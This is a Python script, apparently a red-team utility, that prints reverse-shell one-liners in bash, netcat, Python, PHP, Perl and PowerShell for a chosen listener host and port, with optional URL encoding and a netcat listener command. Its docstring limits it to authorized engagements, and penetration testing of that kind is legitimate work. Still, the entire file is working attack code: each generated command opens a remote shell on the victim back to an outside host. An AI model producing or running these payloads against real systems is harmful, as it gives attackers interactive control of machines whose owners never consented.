#!/usr/bin/env python3
"""
revshell.py — generate reverse-shell one-liners for AUTHORIZED red-team engagements.
For bug bounty, a single `id`/`whoami` (or an OOB callback carrying $(whoami)) is enough proof — you do NOT
need a reverse shell (COMMAND_INJECTION_TESTING_GUIDE.md §11/§19). Use responsibly; clean up.

Usage:
  python3 revshell.py --lhost 10.0.0.1 --lport 4444 --type bash
  python3 revshell.py --lhost 10.0.0.1 --lport 4444 --type python --urlencode
  python3 revshell.py --lhost 10.0.0.1 --lport 4444 --all
Catch it with:  nc -lvnp 4444    (or rlwrap nc -lvnp 4444 ; then upgrade the pty)
"""
import argparse, urllib.parse as up

def shells(ip, port):
    return {
        "bash":   f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "bash196":f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
        "nc":     f"nc {ip} {port} -e /bin/sh",
        "ncfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "python": (f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
                   f"[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"bash\")'"),
        "php":    f"php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl":   (f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                   f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                   f"open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
        "powershell": (f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();"
                       f"[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                       f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);"
                       f"$sb2=$sb+'PS '+(pwd).Path+'> ';$by=([Text.Encoding]::ASCII).GetBytes($sb2);"
                       f"$s.Write($by,0,$by.Length);$s.Flush()}}\""),
    }

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--lhost", required=True)
    ap.add_argument("--lport", type=int, default=4444)
    ap.add_argument("--type", default="bash")
    ap.add_argument("--all", action="store_true")
    ap.add_argument("--urlencode", action="store_true")
    a = ap.parse_args()

    s = shells(a.lhost, a.lport)
    items = s.items() if a.all else [(a.type, s.get(a.type, s["bash"]))]
    print(f"# listener:  nc -lvnp {a.lport}\n# AUTHORIZED engagements only; bug bounty: a single `id` is enough.\n")
    for name, cmd in items:
        out = up.quote(cmd) if a.urlencode else cmd
        print(f"## {name}\n{out}\n")

if __name__ == "__main__":
    main()
